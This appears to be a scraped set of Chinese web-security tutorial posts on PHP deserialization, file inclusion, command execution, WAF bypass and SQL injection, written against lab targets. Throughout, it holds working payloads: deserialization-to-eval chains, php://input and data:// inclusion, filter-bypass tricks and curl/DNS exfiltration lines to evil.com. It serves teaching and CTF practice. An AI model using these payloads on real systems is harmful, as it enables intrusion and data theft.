\u0026#39;hello，我叫\u0026#39;.$this-\u0026gt;name.\u0026#39;，年龄\u0026#39;.$this-\u0026gt;age.\u0026#39;，我是一个\u0026#39;.$this-\u0026gt;job.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; //$this可类比python中的self，旨在访问当前类中的变量 } function setAge($age){\t//函数名字不固定，重要的是括号里的参数 $this-\u0026gt;age = $age; } } $c1 = new People();\t//初始化对象 $c1-\u0026gt;name = \u0026#39;小明\u0026#39;; $c1-\u0026gt;setAge(16); echo serialize($c1); $c1-\u0026gt;speak(); ?\u0026gt; 序列化 上面我们创造了c1这个人对象，但是如果想要发送这个对象不能只依赖复制粘贴，必须使用一种更高效的方法，相当于把复杂的数据压缩为连续的字符串而不丢失信息，这就是序列化。\n1 2 3 $c1_zip = serialize($c1) //输出：O:6:\u0026#34;People\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;小明\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:3:\u0026#34;job\u0026#34;;s:6:\u0026#34;学生\u0026#34;;} //Object名people(6个字)：(含3个变量){string类型，4个字，变量名name}。。。。以此类推 现在我们可以将这串序列化后的字符串传输到其他地方，当需要还原的时候就使用反序列化。\n那么如果是非公有的变量被序列化之后呢？以上上方代码块中的形式为例\n1 O:6:\u0026#34;People\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;小明\u0026#34;;s:6:\u0026#34;*age\u0026#34;;i:16;s:11:\u0026#34;Peoplejob\u0026#34;;s:6:\u0026#34;学生\u0026#34;;} 可以看到两个非公有的变量其字数和数字标的对不上（例如*age标为6个字），这是因为有内容被屏蔽了，我们来补全它\n1 2 O:6:\u0026#34;People\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;小明\u0026#34;;s:6:\u0026#34;%00*%00age\u0026#34;;i:16;s:11:\u0026#34;%00People%00job\u0026#34;;s:6:\u0026#34;学生\u0026#34;;} 实际上就是*的前后各一个%00，然后类+变量的形式在类的前后各一个%00 而%00作为截断符算1个字，这样是不是就对上了。\n%00无法被肉眼观测，也无法复制粘贴，所以我们要用base64的方法来传输：\n1 2 echo base64_encode(serialize($c1)); //输出：Tzo2OiJQZW9wbGUiOjM6e3M6NDoibmFtZSI7czo2OiLlsI/mmI4iO3M6NjoiACoAYWdlIjtpOjE2O3M6MTE6IgBQZW9wbGUAam9iIjtzOjY6IuWtpueUnyI7fQ== 反序列化 可以看到，仅仅使用了这串字符串就还原了对象的所有变量，你也可以把它字面类比为人设。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php class People{ //定义类 //成员变量 public $name; public $age; public $job; //成员方法 function speak(){ echo \u0026#39;hello，我叫\u0026#39;.$this-\u0026gt;name.\u0026#39;，年龄\u0026#39;.$this-\u0026gt;age.\u0026#39;，我是一个\u0026#39;.$this-\u0026gt;job.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; //$this可类比python中的self，旨在访问当前类中的变量 } function __wakeup(){ echo \u0026#39;反序列化程序启动\u0026lt;/br\u0026gt;\u0026#39;; echo \u0026#39;调用防火墙审核\u0026lt;/br\u0026gt;\u0026#39;; } function __destruct(){ echo \u0026#39;我死了\u0026lt;/br\u0026gt;\u0026#39;; } } $c2_zip = \u0026#39;O:6:\u0026#34;People\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;小明\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:3:\u0026#34;job\u0026#34;;s:6:\u0026#34;学生\u0026#34;;}\u0026#39;; $c2 = unserialize($c2_zip); $c2-\u0026gt;speak(); ?\u0026gt; 如果我们接受到的是base64加密过的序列就给它套一层解码就行了\n1 2 $c2_zip = \u0026#39;Tzo2OiJQZW9wbGUiOjM6e3M6NDoibmFtZSI7czo2OiLlsI/mmI4iO3M6NjoiACoAYWdlIjtpOjE2O3M6MTE6IgBQZW9wbGUAam9iIjtzOjY6IuWtpueUnyI7fQ==\u0026#39;; $c2 = unserialize(base64_decode($c2_zip)); 漏洞利用 如果要利用反序列化的漏洞，那么一般是这样的情景：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php class People{ //定义类 //成员变量 public $name; public $age; public $job; //成员方法 function speak(){ echo \u0026#39;hello，我叫\u0026#39;.$this-\u0026gt;name.\u0026#39;，年龄\u0026#39;.$this-\u0026gt;age.\u0026#39;，我是一个\u0026#39;.$this-\u0026gt;job.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; //$this可类比python中的self，旨在访问当前类中的变量 } function __wakeup(){ echo \u0026#39;反序列化程序启动\u0026lt;/br\u0026gt;\u0026#39;; echo \u0026#39;调用防火墙审核\u0026lt;/br\u0026gt;\u0026#39;; } } $c2_zip = $_GET[\u0026#39;man\u0026#39;]; $c2 = unserialize($c2_zip); $c2-\u0026gt;speak(); ?\u0026gt; 我们只要在浏览器里给man传参即可，而且显然我们也可以对手上的序列进行一些修改，以输入自己想要的数据。比如我们把学生改为\u0026rsquo;teacher\u0026rsquo;，同时把字数改为7（原本一个汉字算三个字）。\n1 O:6:\u0026#34;People\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;小明\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:3:\u0026#34;job\u0026#34;;s:7:\u0026#34;teacher\u0026#34;;} 但是这样并不能突破__wakeup()函数，很可能被防火墙拦截。\n解决方案：把变量数+1，即：\n1 O:6:\u0026#34;People\u0026#34;:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;小明\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:18;s:3:\u0026#34;job\u0026#34;;s:7:\u0026#34;teacher\u0026#34;;} 小练习 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;?php class Aurora{ public $test; public $Aurora = \u0026#34;i am aurora\u0026#34;; function __construct(){ $this-\u0026gt;test=new L(); } function __destruct(){ $this-\u0026gt;test-\u0026gt;action(); } } class L{ function action(){ echo \u0026#34;i am L--action\u0026#34;; } } class Evil{ var $test2; function action(){ eval($this-\u0026gt;test2); } } unserialize($_GET[\u0026#39;test\u0026#39;]); ?\u0026gt; 解题方法： 把源代码复制到实验区域，初始化一个对象，修改代码中预设变量值为自己想要实现的效果，加上序列化函数，查看序列化结果，如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php class Aurora{ public $test; public $Aurora = \u0026#34;i am aurora\u0026#34;; function __construct(){ $this-\u0026gt;test=new Evil(); //\t^~~~~~~~此处修改 } function __destruct(){ $this-\u0026gt;test-\u0026gt;action(); } } class L{ function action(){ echo \u0026#34;i am L--action\u0026#34;; } } class Evil{ var $test2=\u0026#39;phpinfo();\u0026#39;; //\t^~~~~~~~此处修改 function action(){ eval($this-\u0026gt;test2); } } unserialize($_GET[\u0026#39;test\u0026#39;]); $a = new Aurora();\t//初始化变量 echo serialize($a);\t//导出序列化结果 ?\u0026gt; 序列化结果：O:6:\u0026#34;Aurora\u0026#34;:2:{s:4:\u0026#34;test\u0026#34;;O:4:\u0026#34;Evil\u0026#34;:1:{s:5:\u0026#34;test2\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}s:6:\u0026#34;Aurora\u0026#34;;s:11:\u0026#34;i am aurora\u0026#34;;} 将序列化结果传入即可。\n其他漏洞 extract() extract()的作用是把get进来的东西分离为变量名和变量值，例如：\n1 2 extract($_GET); echo $test; 如果我传入?test=hello那么在程序看来就是$test='hello'\n例题 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php extract($_GET); if(isset($aurora)){ //加载$flag变量代表的文件 $content = trim(file_get_contents($flag));\t//打开当前目录下的文件 if($aurora == $content){ echo \u0026#39;flag{xxxxx}\u0026#39;; }else{ echo \u0026#34;nonono\u0026#34;; } } ?\u0026gt; 传参：?content=\u0026amp;aurora=\n正则表达式和strpos() 正则表达式遇到%00时会停止匹配，但strpos()不停 当数组遇到strpos()时输出NULL 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php if(isset($_GET[\u0026#39;password\u0026#39;]) ){ //输入的内容一定要不能乱来,只有字符串数字 if(ereg(\u0026#34;^[a-zA-Z0-9]+$\u0026#34;,$_GET[\u0026#39;password\u0026#39;]) === FALSE){ echo \u0026#39;no1\u0026#39;; }else if(strpos($_GET[\u0026#39;password\u0026#39;],\u0026#39; -- \u0026#39;) !== FALSE){ //查找\u0026#39;--\u0026#39;在password中第一次出现的位置 //你输入的内容得要有 -- echo \u0026#39;flag is xxxxxxx\u0026#39;; }else{ echo \u0026#39;no2\u0026#39;; } } ?\u0026gt; 传参：?password[]=123%00--\n","date":"2026-01-25T00:50:33+08:00","permalink":"https://www.retr0.xyz/p/1.24-2-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"1.24-2 弱类型比较漏洞及序列化与反序列化"},{"content":"文件包含漏洞 搭建靶场所用文件：https://pan.baidu.com/s/1IoX4I73J5mnD96tzlnV6UQ?pwd=s86q\n这部分在之前的【文件上传】当中已有运用，详情请看1.19 XSS 注入攻击2与文件上传\n文件包含在php中有两种写法：\ninclude\t出错但继续 require\t出错会停 include_once\t相当于include，但会检查确保只包含一次 require\t相当于require，但会检查确保只包含一次 本地包含（Local File Include） 在靶场中选择File Inclusion(local)选择一个选项后用burp抓包可以看见提交的数据包中第一行为：\n1 GET /vul/fileinclude/fi_local.php?filename=file1.php\u0026amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 HTTP/1.1 这里作者已经帮我们在网站根目录的test文件夹里放了一个phpinfo.txt我们需要使用调用它。\n因为默认情况下这里路径指的是\\vul\\fileinclude\\include文件夹，所以我们要在路径前面写../来回退到上一个目录\n最终的filename是../../../test/phpinfo.txt使用了三次回退正好回退到了根目录\n注： 有些情况下(PHP\u0026lt;5.3.4)filename最后可能需要使用%00截断\n远程包含（Remote File Include） 测试远程文件包含可以用准备好的phpinfo文件：http://www.retr0.xyz/blog-files/phpinfo.txt\n同样提交时使用burp抓包，第一行为：\n1 GET /vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php\u0026amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 HTTP/1.1 这里比较简单，因为include函数是放在数据包里的，所以我们直接把原本的filename替换成远程木马的链接就可以了，例如：\n1 filename=http://www.retr0.xyz/blog-files/phpinfo.txt 有时http://协议异常时也可以试试ftp://\n一般情况下远程文件包含不会像这样简单，因为需要服务端配置了以下环境（php.ini）:\nallow_url_fopen = On allow_url_include = On 结合php伪协议 php://filter（获取源码） 适用场景 1 include($_GET[\u0026#39;file\u0026#39;]); 并且：\nallow_url_include ❌ 无要求 php://filter 默认开启 利用方式 1 ?filename=php://filter/read=convert.base64-encode/resource=index.php 此外也有：\n1 ?filename=php://filter/read=string.toupper|string.rot13/resource=index.php php://input（执行代码） php://input会让服务端将你传的php代码当作一个临时的php文件运行。\n使用方法：\n向目标参数传入php://input，如：\n1 http://target/vuln.php?filename=php://input 同时用POST方式传入你的一句话木马：\n1 \u0026lt;?php phpinfo(); ?\u0026gt; php://file（使用绝对路径打开文件） 使用方法：\n修改目标参数为：\n1 filename=file://绝对路径 如：filename=file:///etc/passwd\n或：filename=file:///C:/windows/\nphp://data（直接在URL中写php代码） 使用方法：\n修改目标参数为：\n1 filename=data://text/plain,\u0026lt;?php phpinfo();?\u0026gt; 或者使用base64加密版（不要带加号）\n1 filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 命令执行漏洞 命令执行在之前的1.6 其他基础web漏洞介绍有过简单介绍，在这里再来总结补充一下。\n例如一个网页上让你输入一个ip，提交后会返回ping这个ip的结果，那么我们要想这个ping的执行是否是由系统命令直接执行的（cmd或bash），如果是那么如何让它执行别的命令？\n危险函数盘点 系统命令执行函数 system() shell_exec() popen() exec() passthru() proc_open() 反引号 command（等效于 shell_exec ()） 代码执行函数 eval() create_function() assert() preg_replace ('/e')（正则替换 /e 修饰符触发代码执行） 漏洞模式分类（含代码示例） 直接执行模式 核心特征：用户输入直接作为命令执行参数 示例代码：system($_GET['cmd']); 攻击逻辑：输入的 cmd 参数无过滤，直接触发命令执行 拼接执行模式 核心特征：用户输入与固定命令拼接后执行 示例代码：$ip = $_GET['ip']; system(\u0026quot;ping -c 4 \u0026quot; . $ip); 攻击逻辑：通过拼接分隔符（如；、|）注入额外命令 动态函数调用模式 核心特征：用户输入作为函数名调用 示例代码：$func = $_GET['func']; $func(); 攻击逻辑：输入危险函数名（如 system）触发执行 命令执行绕过技术 命令分隔符（按系统分类） Linux 系统 分号 ;：顺序执行多个命令（command1; command2） 管道 |：将前命令结果传递给后命令（command1 | command2） 逻辑运算符： \u0026amp;\u0026amp;：前命令成功则执行后命令（command1 \u0026amp;\u0026amp; command2） ||：前命令失败则执行后命令（command1 || command2） 后台执行 \u0026amp;：同时执行多个命令（command1 \u0026amp; command2） 换行符 0x0a：换行分隔命令（command1 0x0a command2） 子 shell：$(command1) 或 \\command1``（执行子 shell 命令） Windows 系统 顺序执行 \u0026amp;：command1 \u0026amp; command2 逻辑运算符：\u0026amp;\u0026amp;（前成功则后执行）、||（前失败则后执行） 管道 |：command1 | command2 空格绕过 $IFS：cat${IFS}/etc/passwd 大括号 {}：{cat,/etc/passwd} 重定向符号：cat\u0026lt;/etc/passwd Hex 编码：X=$'cat\\x09/etc/passwd'\u0026amp;\u0026amp;$X（\\x09 为 Tab 字符） 字符串混淆 变量拼接：a=c;b=at;c=/etc/passwd;$a$b $c 通配符替代：/bin/cat /etc/pass[d]、/???/c?t /etc/passwd 引号混淆：c'a't、c\u0026quot;a\u0026quot;t、c\\at 特殊符号绕过：l's'（绕过 ls 关键词屏蔽）、chmo\\d（绕过 chmod 屏蔽） 编码绕过 Base64 编码（适用于 WAF 拦截关键字） 示例：将cat /etc/passwd编码为Y2F0IC9ldGMvcGFzc3dk 执行命令：echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash Hex 编码 示例：将cat /etc/passwd编码为636174202f6574632f706173737764 执行命令：echo 636174202f6574632f706173737764 | xxd -r -p | bash 无回显攻击技术（Blind Command Execution） DNS 外带（OOB） 原理：将命令执行结果作为子域名发送到攻击者 DNS 服务器 示例：ping 反引号whoami反引号.evil.sh 详见：1.22.SP 奇技淫巧：SQL注入之数据外带\nHTTP 外带 原理：通过 HTTP 请求将结果发送到攻击者服务器 示例：curl http://evil.com/$(cat /etc/passwd|base64) 进阶：带认证 + 数据编码 curl -u user:pass http://evil.com/$(whoami|base64) -d \u0026quot;data=$(cat /etc/passwd|base64)\u0026quot; 时间盲注 原理：通过命令执行后的延迟判断是否成功 示例：sleep 5（Linux）、ping -c 10 127.0.0.1（Linux） 常用系统命令与替代方案 基础命令（按系统分类） Linux 查看目录：ls 读取文件：cat、tac、head、tail、more、less、nl、sort、paste 系统信息：pwd、whoami、chmod 路径格式：/etc/passwd、./haha.php Windows 系统信息：whoami、ipconfig 查看目录：dir 读取文件：type 路径格式：c:/a.txt、c:\\a.txt 关键词WAF屏蔽绕过（替代命令） 屏蔽 cat：使用 tac、more、less、head、tail、nl、sort、paste 屏蔽 ls：使用l's'、ls的通配符替代 屏蔽 php：使用通配符./haha.ph*、./haha.ph? ","date":"2026-01-24T20:58:21+08:00","permalink":"https://www.retr0.xyz/p/1.24-1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"1.24-1 文件包含漏洞和命令执行漏洞"},{"content":"应对WAF(网页防火墙) 过滤空格 使用下面的URL编码尝试替代空格：\n%20 标准空格\n%09 水平tab键\n%0a 新建一行\n%0c 新建一页\n%0d 回车键\n%0b 垂直tab键\n%a0 也是空格键\n特殊的，对于两个不同语法单元之间的空格也可以用运算符来代替：\n||：逻辑或运算符（注意：MySQL 中默认 || 是逻辑或，和OR等价，部分环境需配置）\n\u0026amp;：位与运算符\n^：位异或运算符\n+：算术加法运算符（前提是左右两边可转换为数字）\n例如：\n1 ?id=1\u0026#39;|extractvalue(1,concat(0x7e,database()));%00 传入上面的参数后，因为select查询和extractvalue是两个无关的语法单元，所以可以用|连接。\n过滤注释符 过滤注释符后我们的思路一般就是两种：\n将注释符换为截止符%00 使得查询语句中$id前后的符号都能闭合 这里针对第二种进行讲解（以Less-23为例）：\n将前后两个单引号闭合再用or连接，即：\n1 ?id=\u0026#39; or extractvalue(1,concat(0x7e,database())) or\u0026#39; 这样在整个查询语句中就是：\n1 $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;\u0026#39; or extractvalue(1,concat(0x7e,database())) or\u0026#39; \u0026#39; LIMIT 0,1\u0026#34;; 过滤and、or 替换URL编码：\nor = || = %7c%7c(url编码)\nand = \u0026amp;\u0026amp; = %26%26(url编码)\n双写绕过：\nor\u0026mdash;\u0026gt;oorr\nand\u0026ndash;\u0026gt;anandd\n过滤-``/``\\等重要符号 使用URL编码绕过\n过滤union、select等重要单词 随机其中几个字母大小写 双写绕过 过滤数据库名 可对数据库名进行HEX编码，顺便也可绕过对引号的屏蔽，例如：\n1 slect table_name from information_schema where table_schema=0x7365637572697479 补充 大小写绕过 unION SelECT\n双写绕过 uniunionon\n编码绕过 hex和urlencode\n注释符 uni/**/on\n反引号 列名和表名可以使用``包裹\n1 select * from `select` 内联注释 and /*!select*/ 1,2,3\n\u0026lt;\u0026gt;绕过 uni\u0026lt;\u0026gt;on sel\u0026lt;\u0026gt;ect\n屏蔽逗号 select substr(\u0026quot;haha\u0026quot;,1,3)\nselect substr(\u0026quot;haha\u0026quot; from 1 to 3)\nunion select 1,2,3=union select * from (select 1)a join (select 2)b join (select 3)c join;\nlimit 0,1=limit 0 offset 1\nsleep屏蔽 and sleep(1)=and benchmark(100000000000,1)\ngroup_concat屏蔽 select group_concat(\u0026quot;haha\u0026quot;,\u0026quot;nihao\u0026quot;)=select concat_ws(\u0026quot;haha\u0026quot;,\u0026quot;nihao\u0026quot;)\n屏蔽等号 like rlike regexp \u0026lt;\u0026gt;\n1' or '1'='1\n1' or '1'\u0026lt;\u0026gt;'1\nPOST情况屏蔽# -- a\nip地址屏蔽 X-Forwarded-For: 1.1.1.1\nX-Remote-IP\nX-Originating-IP\nX-Real-Ip\n修改静态资源 www.x.com/sql.php?id=1\nwww.x.com/sql.php/1.js?id=1\nurl白名单 防火墙很多时候不会去管管理员后台做了什么，利用waf自带的白名单admin login manager system sys\nwww.x.com/sql.php/admin.php?id=1\nwww.x.com/sql.php?xxxx=/manager/\u0026amp;id=1\nwww.x.com/../../../../../manager.php/../../../sql.php?id=1\n爬虫白名单 伪造自己成为搜索引擎的爬虫（ua的伪造）\n增加干扰 union all %a0 select\n利用insert、update和delete进行注入 [1] 思路简要说明 insert、update、delete注入的本质是参数未经过滤，攻击者可在语句的关键位置插入恶意 SQL 片段，利用数据库执行特性获取敏感数据，核心常用方法为报错注入，具体应用场景如下：\ninsert 注入：在insert into 表名(字段1,字段2) values(值1,值2)中，针对 “值 1”“值 2” 等参数构造恶意内容（如插入错误的函数调用、语法错误片段），触发数据库报错，通过错误提示回显数据库名、表名、字段名等信息。 update 注入：在update 表名 set 字段=值 where 条件中，针对 “值” 或 “条件” 部分注入恶意 SQL，例如构造含报错函数的语句，使数据库执行时抛出包含敏感数据的错误（如用户密码、权限信息等）。 delete 注入：在delete from 表名 where 条件中，针对 “条件” 参数注入恶意片段，通过触发报错或利用条件判断逻辑，间接获取数据或破坏数据完整性（注入核心以 “获取数据” 为目标时，优先通过报错回显实现）。 本地测试 执行下面的的命令创建测试用数据\n1 2 3 4 5 6 7 8 9 create database newdb; use newdb; create table users ( id int(3) not null auto_increment, username varchar(20) not null, passowrd varchar(20) not null, primary key(id) ); insert into users values(1,\u0026#39;janes\u0026#39;,\u0026#39;Eyre\u0026#39;); 接下来我们通过单双引号包含的形式来人为构造语法错误实现报错。\n1 2 insert into users(id,username,passowrd) values (2,\u0026#39;\u0026#39;payload\u0026#39;\u0026#39;,\u0026#39;testpwd\u0026#39;); insert into users(id,username,passowrd) values (3,\u0026#34;\u0026#34;payload\u0026#34;\u0026#34;,\u0026#39;testpwd\u0026#39;); 然后就大同小异了，插入我们的payload（以查看版本号为例）。\n1 2 3 or updatexml(1,concat(0x7e,(version())),0) or // 标准句式就是： or 报错注入语句 or 其他报错注入语句请见 1.22 SQL注入系列-2\nInsert:\n1 insert into users(id,username,passowrd) values(2,\u0026#39;haha\u0026#39; 注入点 \u0026#39;\u0026#39;,\u0026#39;testpwd\u0026#39;); Update:\n1 update user set passowrd=\u0026#39;testpwd\u0026#39; 注入点 \u0026#39;\u0026#39; where id=2 and username=\u0026#39;haha\u0026#39;; Delete:\n1 delete from users where id=2 注入点 \u0026#39;\u0026#39;; 此外，除了or (payload) or闭合格式，还有下面的其他闭合变种：\n1 2 3 4 5 6 7 \u0026#39;or (payload) or \u0026#39; \u0026#39; and (payload) and \u0026#39; \u0026#39; or (payload) and \u0026#39; \u0026#39; or (payload) and \u0026#39;=\u0026#39; \u0026#39; * (payload) *\u0026#39; \u0026#39; or (payload) and \u0026#39; \u0026#34;- (payload) -\u0026#34; 宽字节注入 在一些情况下，目标会使用诸如addslashes()、mysql_real_escape_string()、mysql_escape_string()、Magic_quotes_gpc()等函数对我们传入的内容进行转义，特别是引号之类的内容，这就会导致我们无法通过直接在参数里填入'来达成闭合，而宽字节注入就是为了解决这个问题。\n宽字节概念 相对于单字节，我们引入一个字符数大小为两个字节的为宽字节，比如GBK编码，我们汉字通常使用的就是GBK编码，也就是说一次性会读取两个字节。\n注入原理 以addslashes()函数为例，它的目的是根据预定义的字符（由服务端根据需要配置，例如单双引号）在你传的参数中检查是否存在这些预定义字符，如果有就在前面加上一个\\起到转义的作用。这样当你试图传入?id=1'时实际的参数为?id=1\\'后面的引号失去了闭合作用。\n但假如我们像下面这样传参：?id=%df'🤔\n你先别急%df是什么意思，但是你肯定知道\\的URL编码是%5C，这样一来参数在程序内部就变成了%df%5C'，而%df%5C实际上是[運]这个汉字的GBK编码，而MySQL会优先识别汉字的GBK编码**（前提是数据库本身就是GBK编码）**而忽略了转义符的存在，导致后面跟着的单引号仍然具有闭合作用。\n具有相似性质的汉字还有这些：\n小测验（Less-32） 使用刚才学习的宽字节注入轻松完成闭合并获取到了报错位：\n1 ?id=%df\u0026#39;union select 1,2,3 --+ 接下来的操作就和第一关一样了。\n最终payload：\n1 ?id=%df\u0026#39;union select 1,group_concat(username),group_concat(password) from users --+ 使用sqlmap进行宽字节注入 新增参数：--tamper unmagicquotes指加载unmagicquotes这个宽字节注入专用模型，其他没什么区别。\n爆库名：\n1 sqlmap -u \u0026#34;http://192.168.80.134/Less-32/?id=\u0026#34; --tamper unmagicquotes --current-db --batch 爆表名：\n1 sqlmap -u \u0026#34;http://192.168.80.134/Less-32/?id=\u0026#34; --tamper unmagicquotes -D security --tables --batch 爆字段名：\n1 sqlmap -u \u0026#34;http://192.168.80.134/Less-32/?id=\u0026#34; --tamper unmagicquotes -D security -T users --columns --batch 爆字段数据：\n1 sqlmap -u \u0026#34;http://192.168.80.134/Less-32/?id=\u0026#34; --tamper unmagicquotes -D security -T users -C username,password --dump --batch 参考文献 [1] babers. 利用 insert、update 和 delete 注入获得数据 [EB/OL]. 2017-07-28. https://www.cnblogs.com/babers/articles/7252401.html. [2026-01-23]\n","date":"2026-01-23T20:44:35+08:00","permalink":"https://www.retr0.xyz/p/1.23-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-3/","title":"1.23 SQL注入系列-3"},{"content":"URL 编码参考手册 ASCII 字符 URL-编码 space %20 ! %21 \u0026quot; %22 # %23 $ %24 % %25 \u0026amp; %26 ' %27 ( %28 ) %29 * %2A + %2B , %2C - %2D . %2E / %2F 0 %30 1 %31 2 %32 3 %33 4 %34 5 %35 6 %36 7 %37 8 %38 9 %39 : %3A ; %3B \u0026lt; %3C = %3D \u0026gt; %3E ? %3F @ %40 A %41 B %42 C %43 D %44 E %45 F %46 G %47 H %48 I %49 J %4A K %4B L %4C M %4D N %4E O %4F P %50 Q %51 R %52 S %53 T %54 U %55 V %56 W %57 X %58 Y %59 Z %5A [ %5B \\ %5C ] %5D ^ %5E _ %5F ` %60 a %61 b %62 c %63 d %64 e %65 f %66 g %67 h %68 i %69 j %6A k %6B l %6C m %6D n %6E o %6F p %70 q %71 r %72 s %73 t %74 u %75 v %76 w %77 x %78 y %79 z %7A { %7B | %7C } %7D ~ %7E %7F ` %80  %81 ‚ %82 ƒ %83 „ %84 … %85 † %86 ‡ %87 ˆ %88 ‰ %89 Š %8A ‹ %8B Œ %8C  %8D Ž %8E  %8F  %90 ' %91 ' %92 \u0026quot; %93 \u0026quot; %94 • %95 – %96 — %97 ˜ %98 ™ %99 š %9A › %9B œ %9C  %9D ž %9E Ÿ %9F %A0 ¡ %A1 ¢ %A2 £ %A3 ¤ %A4 ¥ %A5 ¦ %A6 § %A7 ¨ %A8 © %A9 ª %AA « %AB ¬ %AC ­ %AD ® %AE ¯ %AF ° %B0 ± %B1 ² %B2 ³ %B3 ´ %B4 µ %B5 ¶ %B6 · %B7 ¸ %B8 ¹ %B9 º %BA » %BB ¼ %BC ½ %BD ¾ %BE ¿ %BF À %C0 Á %C1 Â %C2 Ã %C3 Ä %C4 Å %C5 Æ %C6 Ç %C7 È %C8 É %C9 Ê %CA Ë %CB Ì %CC Í %CD Î %CE Ï %CF Ð %D0 Ñ %D1 Ò %D2 Ó %D3 Ô %D4 Õ %D5 Ö %D6 × %D7 Ø %D8 Ù %D9 Ú %DA Û %DB Ü %DC Ý %DD Þ %DE ß %DF à %E0 á %E1 â %E2 ã %E3 ä %E4 å %E5 æ %E6 ç %E7 è %E8 é %E9 ê %EA ë %EB ì %EC í %ED î %EE ï %EF ð %F0 ñ %F1 ò %F2 ó %F3 ô %F4 õ %F5 ö %F6 ÷ %F7 ø %F8 ù %F9 ú %FA û %FB ü %FC ý %FD þ %FE ÿ %FF ","date":"2026-01-23T15:52:10+08:00","permalink":"https://www.retr0.xyz/p/url-%E7%BC%96%E7%A0%81%E5%8F%82%E8%80%83%E6%89%8B%E5%86%8C/","title":"URL 编码参考手册"},{"content":"前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入\n#\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突\n/**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字\n在实践，当上面的注释符不可用时，还可以尝试%00或闭合的形式绕过\nLIKE语句和转义字符 LIKE语句 再MySQL中LIKE语句用于模糊查询，其基本格式就是\n1 select * from 数据库名.数据表名 WHERE 字段名 like \u0026#39;%\\匹配目标%\u0026#39; 例如在一堆数据中查询包含@的数据\n1 select * from test.db1 WHERE pwd like \u0026#39;%\\@%\u0026#39; 但是因为一些字符的特殊性导致like语句的参数并不全都是'%\\匹配目标%'那么简单，\n例如你要查询含有\\的数据，参数就要填'%\\\\\\\\%'，详情见下文。\n转义字符对照表 转义序列 代表的字符 说明 \\n 换行符（LF） 表示换行操作 \\t 制表符（Tab） 表示横向制表 \\r 回车符（CR） 表示回车操作 \\b 退格符 表示删除前一个字符的操作 \\0 NULL 字符 ASCII 0 字符，常用于字符串结束标记 \\\\ 反斜杠 \\ 表示反斜杠本身（字符串中直接写\\会被解析为转义符，需用\\\\表示字面量） \\' 单引号 ' 表示单引号本身（避免与字符串的单引号边界冲突） \\\u0026quot; 双引号 \u0026quot; 表示双引号本身（当 SQL 模式为ANSI_QUOTES时，双引号可能被解析为标识符，需转义） 在 LIKE 查询中，%和_是通配符，若要匹配它们本身，必须额外转义。\n目标字符 转义方式（默认） 转义方式（ESCAPE 自定义） 示例（默认转义） %（百分号） \\% #%（以#为转义符） LIKE '%\\%%' _（下划线） \\_ #_（以#为转义符） LIKE '%\\_%' \\（反斜杠） \\\\\\\\ #\\（以#为转义符） LIKE '%\\\\\\\\%' 🔍 注意：\n反斜杠只转义紧跟其后的一个字符，所以\\%只会把后面的%转义为普通字符，不会影响其他字符。 在 LIKE 中，反斜杠本身需要 双重转义 （\\\\\\\\），因为 MySQL 会先解析一次\\\\为\\，然后 LIKE 再解析一次\\\\为\\，最终得到一个字面量\\。 ORDER BY与联合查询注入 这一部分在之前的文章已有讲述，详见1.5 mysql注入初步\n仅补充一下注入测试位置\n报错注入 报错注入指利用错误信息回显获取数据库内容\n适用于页面无法正常回显查询内容，但会详细显示查询过程的错误信息时，可通过构造特殊SQL语句触发错误，将想要查询的数据通过错误信息带出。\n✅标准注入方法是（以单引号闭合为例）：\n1 ?id=1\u0026#39; and (查询语句) --+ 方法一：XPath函数报错 updatexml函数的定义 updatexml()函数用于修改XML文档中的节点。\n1 updatexml(XML_document, XPath_string, new_value) 第一个参数XML_document是XML文档对象的名称。\n第二个参数XPath_string是指定需要更新的XML节点的XPath表达式。\n第三个参数new_value是新值，用于替换找到的符合条件的数据。\n如果XPath_string格式错误，MySQL会抛出一个XPath语法错误。\nupdatexml报错注入 1 SELECT updatexml(1,concat(0x7e,version(),0x7e),1); 